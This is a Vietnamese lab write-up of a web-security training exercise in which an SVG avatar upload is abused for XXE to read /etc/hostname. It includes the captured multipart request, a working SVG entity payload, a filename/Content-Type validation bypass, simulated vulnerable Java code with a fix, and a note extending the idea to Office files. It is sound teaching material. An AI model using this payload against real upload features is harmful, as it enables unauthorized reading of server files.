![](../assets/Pasted%20image%2020261123095411.png)

# 1. Mục tiêu
Khai thác lỗ hổng XXE thông qua chức năng **upload ảnh avatar** để đọc nội dung file /etc/hostname. Đây lại là một kiểu **hidden attack surface** nữa: app cho upload avatar và xử lý (render) ảnh ở server. Mấu chốt là **SVG là một định dạng ảnh dựa trên XML**, và thư viện xử lý ảnh phía server lại hỗ trợ SVG → parse SVG chính là parse một tài liệu XML do attacker kiểm soát. App tưởng nó đang nhận một "tấm ảnh", nhưng thực chất là đang nuốt XML của mình.

Khác với LAB08 (chỉ control một field sâu nên phải xài XInclude), ở đây mình **kiểm soát trọn vẹn cả file** upload lên → quay lại dùng được **DOCTYPE/ENTITY kinh điển**.

# 2. Recon
Ở lab này có chức năng comment bài viết, kèm theo upload avatar. Đăng một comment thử với một ảnh .jpg bình thường, bắt request trên Burp.

![](../assets/Pasted%20image%2020261123095522.png)![](../assets/Pasted%20image%2020261123101633.png)

```http
POST /post/comment HTTP/2
Host: 0ad400500384725380841c37007800d0.web-security-academy.net
Cookie: session=6NKz2UeAA9skyM3z9swLvPuDIZijCawD
Content-Length: 120514
Cache-Control: max-age=0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Origin: https://0ad400500384725380841c37007800d0.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8p8AooA3fMwMFS4g
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ad400500384725380841c37007800d0.web-security-academy.net/post?postId=2
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

------WebKitFormBoundary8p8AooA3fMwMFS4g
Content-Disposition: form-data; name="csrf"

D7rIAmXkefM03IcSKbnuN1IE4JprPVIH
------WebKitFormBoundary8p8AooA3fMwMFS4g
Content-Disposition: form-data; name="postId"

2
------WebKitFormBoundary8p8AooA3fMwMFS4g
Content-Disposition: form-data; name="comment"

test
------WebKitFormBoundary8p8AooA3fMwMFS4g
Content-Disposition: form-data; name="name"

test_name
------WebKitFormBoundary8p8AooA3fMwMFS4g
Content-Disposition: form-data; name="avatar"; filename="normal_img.jpg"
Content-Type: image/jpeg

ÿØÿà
.................................
................................



------WebKitFormBoundary8p8AooA3fMwMFS4g
Content-Disposition: form-data; name="email"

test@gmail.com
------WebKitFormBoundary8p8AooA3fMwMFS4g
Content-Disposition: form-data; name="website"

http:test.com
------WebKitFormBoundary8p8AooA3fMwMFS4g--

```

Phần đáng chú ý là block `name="avatar"` — nơi file ảnh được gửi lên dưới dạng multipart, có `filename` và `Content-Type` riêng. Đây chính là cửa để tuồn SVG vào.

# 3. Exploit
Ý tưởng: thay nội dung phần avatar bằng một file **SVG có nhúng XXE kinh điển**. Vì data sẽ về qua **ảnh render** (kênh thị giác), nên chọn đọc file **/etc/hostname** — file chỉ có một dòng ngắn, vừa khung ảnh. Nếu chọn file nhiều dòng như /etc/passwd thì chữ sẽ tràn ra ngoài khung `<text>`, không đọc được.

Payload SVG:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

Khai một entity `xxe` trỏ tới /etc/hostname, rồi gọi `&xxe;` bên trong element `<text>`. Khi server render SVG, nội dung file sẽ được "vẽ" thành chữ trong ảnh.

### Vướng mắc thực chiến
Lần đầu gửi payload, server trả về **400 Bad Request + "Avatar file must be an image."**

Nguyên nhân: khi thay nội dung file trong Burp, phần `filename` bị rỗng (`filename=""`), cộng thêm `Content-Type: image/jpeg` không khớp với nội dung thật. Lớp validate "phải là ảnh" của server nhìn vào **tên file / Content-Type** để chặn ngay từ cửa → payload trượt, thậm chí còn chưa kịp tới parser.

Cách sửa: trả lại cho phần avatar một `filename` có đuôi `.svg` (có thể chỉnh luôn `Content-Type` thành `image/svg+xml` cho khớp). Khi đó request qua được lớp validate → SVG đi tới parser → `&xxe;` mới nổ.

```http
------WebKitFormBoundarysyZdL0BXMUpG41Tj
Content-Disposition: form-data; name="avatar"; filename="abc.svg"
Content-Type: image/jpeg

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>

```
![](../assets/Pasted%20image%2020261123101530.png)

### Cơ chế lấy data: kênh thị giác (in-band, visual exfil)
Đây là điểm đặc biệt của lab — data không nằm trong text của response mà nằm trong **pixel của ảnh**:
- Parser đọc SVG → `&xxe;` được resolve → đọc nội dung /etc/hostname.
- Nội dung file được nhét vào element `<text>`.
- Server render SVG ra ảnh avatar → nội dung file hiện thành **chữ trong ảnh**.
- Mở/tải ảnh avatar lên xem → đọc chữ = nội dung file.

![](../assets/Pasted%20image%2020261123101656.png)
![](../assets/Pasted%20image%2020261123101747.png)
![](../assets/Pasted%20image%2020261123101844.png)
![](../assets/Pasted%20image%2020261123102151.png)

Avatar hiển thị ra chuỗi `6cba0d54f980` — chính là nội dung /etc/hostname. Khai thác thành công, hoàn thành lab.

# 4. Mô phỏng backend xử lý
```java
// [LỖI 1] — validate hời hợt: chỉ nhìn tên/Content-Type, không kiểm nội dung thật
String name = avatar.getOriginalFilename().toLowerCase();
if (!(name.endsWith(".jpg") || name.endsWith(".png") || name.endsWith(".gif") || name.endsWith(".svg")))
    return badRequest("Avatar file must be an image.");

// [LỖI 2] — thư viện ảnh (vd Apache Batik) parse SVG như XML, resolve external entity
BufferedImage img = renderSvg(avatar.getBytes());   // SVG -> parse XML -> &xxe; đọc /etc/hostname
saveAvatar(img);                                    // render ra ảnh, nội dung file bị vẽ vào <text>
```

Hai cái sai: (1) tin vào phần mở rộng/Content-Type do client khai, nên chỉ cần đặt tên `.svg` là lách qua; (2) bộ xử lý ảnh resolve external entity khi parse SVG, biến chức năng upload ảnh thành một XXE sink.

# 5. Cách vá
```java
// vá [LỖI 1] — kiểm tra nội dung thật (magic bytes), đừng tin tên file
if (!isRealRasterImage(avatar.getBytes()))   // chỉ nhận JPEG/PNG/GIF thật
    return badRequest("Avatar file must be an image.");

// vá [LỖI 2] — nếu buộc phải hỗ trợ SVG, cấu hình bộ parse SVG tắt hẳn DTD
SAXSVGDocumentFactory f = new SAXSVGDocumentFactory(parserName);
f.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

Chặn tận gốc: tốt nhất là **không hỗ trợ SVG** cho avatar, chỉ cho phép định dạng ảnh raster (JPEG/PNG/GIF) và kiểm tra bằng magic bytes thay vì tên file. Nếu bắt buộc phải nhận SVG, hãy cấu hình bộ parse tắt hẳn DTD (`disallow-doctype-decl`). Như thường lệ, hạn chế tối đa quyền của tiến trình xử lý ảnh để dù có lọt cũng không đọc được file hệ thống.

# 6. Nhìn lại 2 lab về hidden attack surface (08 & 09)
```
Lab08. Input bị NHÚNG vào XML server-side, chỉ control 1 field sâu
       -> không chèn được DOCTYPE -> dùng XInclude (xi:include) -> đọc /etc/passwd qua response
Lab09. Upload "ảnh" nhưng SVG = XML, control cả file
       -> DOCTYPE/ENTITY kinh điển -> đọc /etc/hostname qua ảnh render (kênh thị giác)
```
Bài học chung: XXE không chỉ ở request XML lộ liễu. Phải soi cả những chỗ dữ liệu bị xử lý như XML mà không hiển nhiên — input nhúng vào XML ở backend, hay file upload có định dạng dựa trên XML (SVG, DOCX, XLSX...).

> **Biến thể cùng họ — file Office (DOCX/XLSX/PPTX):** bản chất mỗi file Office là một **gói ZIP chứa nhiều file XML**. Nên cùng một ý tưởng: giải nén file ra → sửa một file XML bên trong (ví dụ `word/document.xml`) để chèn payload XXE → nén lại → upload. Chỗ nào server parse các XML đó mà bật external entity là dính y hệt lab SVG này.
